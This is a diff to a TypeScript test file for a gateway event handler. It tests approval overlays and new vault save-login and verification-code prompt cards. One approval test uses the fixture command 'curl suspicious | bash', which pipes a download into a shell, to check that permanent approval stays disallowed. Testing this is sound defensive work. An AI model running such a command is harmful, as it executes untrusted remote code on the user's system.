@@ -1348,7 +1348,7 @@ describe('createGatewayEventHandler', () => {
     expect(getOverlayState().approval).toMatchObject({ allowPermanent: true, requestId: 'srq-approval' })
   })
 
-  it('preserves allow_permanent=false on approval overlays (tirith warning)', () => {
+  it('preserves allow_permanent=false on approval overlays', () => {
     serverRequest('approval', {
       allow_permanent: false,
       command: 'curl suspicious | bash',
@@ -1375,7 +1375,7 @@ describe('createGatewayEventHandler', () => {
   })
 
   it('declines the requests a terminal cannot answer so the channel fails them fast', () => {
-    for (const method of ['preview.act', 'window.read', 'tour', 'mcp.setup', 'vault.code']) {
+    for (const method of ['preview.act', 'window.read', 'tour', 'mcp.setup', 'terminal.read']) {
       expect(serverRequest(method, {}).handled).toBe(false)
     }
   })
@@ -2362,6 +2362,66 @@ describe('createGatewayEventHandler', () => {
       // Turn continues without finalizing or throwing
       expect(getUiState().busy).toBe(true)
       expect(appended).toHaveLength(0)
+    })
+
+    describe('vault.save_login prompt (#109101)', () => {
+      it('opens the two-step save-login card for the server request', () => {
+        const { handled } = serverRequest(
+          'vault.save_login',
+          {
+            origin: 'https://www.linkedin.com',
+            session_id: 'sess',
+            site: 'www.linkedin.com'
+          },
+          'save-9'
+        )
+
+        expect(handled).toBe(true)
+        expect(getOverlayState().vaultSaveLogin).toEqual({
+          origin: 'https://www.linkedin.com',
+          requestId: 'save-9',
+          site: 'www.linkedin.com'
+        })
+        expect(getUiState().status).toBe('save login for www.linkedin.com')
+      })
+
+      it('tears the card down on request.cancel, but only for the matching request', () => {
+        const onEvent = createGatewayEventHandler(buildCtx([]))
+
+        serverRequest(
+          'vault.save_login',
+          {
+            origin: 'https://a.example',
+            session_id: 'sess',
+            site: 'a.example'
+          },
+          'save-1'
+        )
+        expect(getOverlayState().vaultSaveLogin).not.toBeNull()
+
+        onEvent({ payload: { id: 'save-2' }, type: 'request.cancel' } as any)
+        expect(getOverlayState().vaultSaveLogin).not.toBeNull()
+
+        onEvent({ payload: { id: 'save-1' }, type: 'request.cancel' } as any)
+        expect(getOverlayState().vaultSaveLogin).toBeNull()
+      })
+
+      it('opens the verification-code card for vault.code and tears it down on request.cancel', () => {
+        const onEvent = createGatewayEventHandler(buildCtx([]))
+
+        const { handled } = serverRequest(
+          'vault.code',
+          { hint: 'sent to •••42', session_id: 'sess', site: 'github.com' },
+          'code-1'
+        )
+
+        expect(handled).toBe(true)
+        expect(getOverlayState().vaultCode).toEqual({ hint: 'sent to •••42', requestId: 'code-1', site: 'github.com' })
+        expect(getUiState().status).toBe('verification code for github.com')
+
+        onEvent({ payload: { id: 'code-1' }, type: 'request.cancel' } as any)
+        expect(getOverlayState().vaultCode).toBeNull()
+      })
     })
   })
 })
